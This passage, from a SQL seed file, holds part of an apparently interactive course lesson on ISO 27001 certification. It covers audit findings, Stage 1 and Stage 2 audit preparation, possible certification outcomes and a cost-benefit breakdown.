```
✓ Vulnerability management procedure
✓ Scanning schedule
✓ Recent scan reports
✓ Patch management policy
✗ Missing: Remediation tracking
✗ Missing: SLA for critical patches
```

**Audit Finding**: **MINOR NON-CONFORMITY** ⚠️

**Corrective Action Required**:
- Implement vulnerability tracking system
- Define and document patching SLAs
- Evidence of compliance within 30 days

---

## 🎓 Certification Audit Preparation

### Stage 1 Audit (Documentation Review)

**Auditor Reviews**:
- ISMS scope
- Information security policy
- Risk assessment methodology
- Statement of Applicability
- Risk treatment plan
- Internal audit reports
- Management review minutes

**Common Issues**:
- Incomplete documentation
- Policies not approved
- Risk assessment not comprehensive
- SoA missing justifications

**Your Preparation**:
```
✓ All documents complete and approved
✓ Documents version controlled
✓ Documents accessible to auditor
✓ Evidence organized and indexed
✓ Team briefed on audit process
```

---

### Stage 2 Audit (Implementation Review)

**Auditor Activities**:
- Interview staff
- Review evidence
- Test controls
- Observe processes
- Sample transactions

**Sample Questions**:
1. "Explain your role in information security"
2. "How do you report security incidents?"
3. "Show me how you classify data"
4. "Walk me through your access request process"

**Your Team Preparation**:
```
✓ Staff trained on ISMS
✓ Everyone knows their responsibilities
✓ Evidence readily available
✓ Processes being followed
✓ Mock audit conducted
```

---

## 📈 Certification Decision

### Possible Outcomes:

**1. Certification Granted** ✓
- No major non-conformities
- Minor issues acceptable
- Certificate issued

**2. Certification Deferred** ⚠️
- Major non-conformities found
- Corrective actions required
- Re-audit needed

**3. Certification Denied** ✗
- Fundamental ISMS failures
- Significant gaps
- Major rework required

---

## 💰 Cost-Benefit Analysis

### Investment:
```
Consulting: $150,000
Tools/Software: $50,000
Training: $30,000
Staff Time: $200,000
Certification Audit: $40,000
Annual Surveillance: $15,000/year

Total First Year: $470,000
Annual Ongoing: $65,000
```

### Benefits:
```
Competitive Advantage:
- Required by enterprise customers
- Differentiator in market
- Enables new business opportunities

Risk Reduction:
- Fewer security incidents
- Better incident response
- Reduced breach costs

Operational Efficiency:
- Standardized processes
- Clear responsibilities
- Better documentation

Compliance:
- Meets regulatory requirements
- Satisfies customer requirements
- Reduces audit burden
```

**ROI**: Positive within 18-24 months for most organizations

---

## ✅ Certification Achieved!

**Congratulations!** You''ve successfully achieved ISO 27001 certification.

**Next Steps**:
1. Celebrate with team
2. Communicate to customers
3. Update marketing materials
4. Plan surveillance audits
5. Continuous improvement

---

## 🎬 Next Lesson

In the next lesson, you''ll learn about **"SOC 2 Compliance"**, including the Trust Services Criteria and how to prepare for a SOC 2 Type II audit.

---

## 📚 Additional Resources

- ISO/IEC 27001:2013 Standard
- ISO/IEC 27002:2013 Code of Practice
- ISMS Implementation Guide
- Internal Auditor Training
- Lead Auditor Course

---

## 💡 Key Takeaways

1. ISO 27001 is a journey, not a destination
2. Management commitment is critical
3. Risk-based approach is key
4. Documentation must reflect reality
5. Continuous improvement is required
6. Certification is valuable but maintaining it is more important
',
    'interactive',
    4,
    75
);

COMMIT;

-- Made with Bob
